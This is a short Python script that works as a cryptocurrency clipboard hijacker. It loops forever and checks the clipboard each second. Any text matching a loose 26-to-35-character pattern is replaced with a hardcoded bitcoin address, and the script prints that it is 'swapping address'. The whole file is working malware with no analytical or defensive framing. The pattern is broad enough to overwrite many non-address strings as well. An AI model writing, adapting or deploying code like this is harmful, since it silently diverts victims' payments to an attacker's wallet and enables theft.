#! python3
import pyperclip
import time
import re

#? REGEX for matching a bitcoin address
btc_check = re.compile(r'([A-Za-z0-9]){26,35}')

#? Main FUNCTION
def get_clipboard():
    #? Look for a clipboard_data
    try:
        clipboard_data = pyperclip.paste()
    except:
        raise Exception("an error occurred")

    #? FOR LOGGING PURPOSES 
    #? CHECK for a BTC address in clipboard_data
    if not bool(btc_check.search(clipboard_data)):
        print("No btc in clipboard")
        return False        
    #? REPLACING THE BTC address FOUND in the clipboard_data
    btc = btc_check.sub(r'3K1nGEijpMxzP5Vy7WtZxjwVwYUgcE9DmC', str(clipboard_data.strip('  \n \r \t')))
    print ("BTC address found swapping address!")
    pyperclip.copy(btc)

#MAIN LOOP
if __name__ == '__main__':
    while True:
        if get_clipboard():
            time.sleep(1)
        else:
            time.sleep(1)